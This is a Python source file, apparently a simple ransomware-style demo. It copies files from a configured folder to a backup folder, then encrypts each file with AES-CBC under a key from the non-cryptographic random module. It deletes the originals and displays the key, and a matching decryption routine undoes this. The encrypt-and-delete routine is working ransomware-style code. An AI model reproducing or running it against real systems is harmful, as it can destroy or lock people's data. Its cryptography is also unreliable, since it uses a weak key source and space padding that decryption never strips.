import config as cfg

def encrypt_file(file, key):
    chunk_size = 65536
    output = cfg.os.path.join(cfg.os.path.dirname(file), cfg.os.path.basename(file) + cfg.suffix)
    file_size =  str(cfg.os.path.getsize(file)).zfill(16)
    iv = cfg.os.urandom(16)
    encryptor = cfg.AES.new(key, cfg.AES.MODE_CBC, iv)

    with open(file, "rb") as (infile):
        with open(output, "wb") as (outfile):
            outfile.write(bytes(file_size, "utf-8"))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                else:
                    if len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))

def launch_decryption(key):
    encfiles = cfg.os.listdir(cfg.root_path)
    for f in encfiles:
        decrypt_file(cfg.root_path + f, key)
        cfg.os.remove(cfg.root_path + f)

def decrypt_file(file, key):
    chunk_size = 65536

    with open(file, "rb") as (infile):
        file_size = infile.read(16)
        iv = infile.read(16)
        decryptor = cfg.AES.new(key, cfg.AES.MODE_CBC, iv)
        output = cfg.os.path.join(cfg.os.path.dirname(file).replace(cfg.suffix, ""), cfg.os.path.basename(file)).replace(cfg.suffix, "")
        with open(output, "wb") as (outfile): 
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                else:
                    outfile.write(decryptor.decrypt(chunk))

def main():
    files = cfg.os.listdir(cfg.root_path)
    for f in files:
        cfg.shutil.copyfile(cfg.root_path + f, cfg.safe_path + f)

    key = cfg.random.randbytes(16)
    key = key.replace(b'"', b"'")
    print(key)
    for f in files:
        encrypt_file(cfg.root_path + f, key)
        cfg.os.remove(cfg.root_path + f)
    
    cfg.dsp.display(key)

if __name__ == "__main__":
    main()
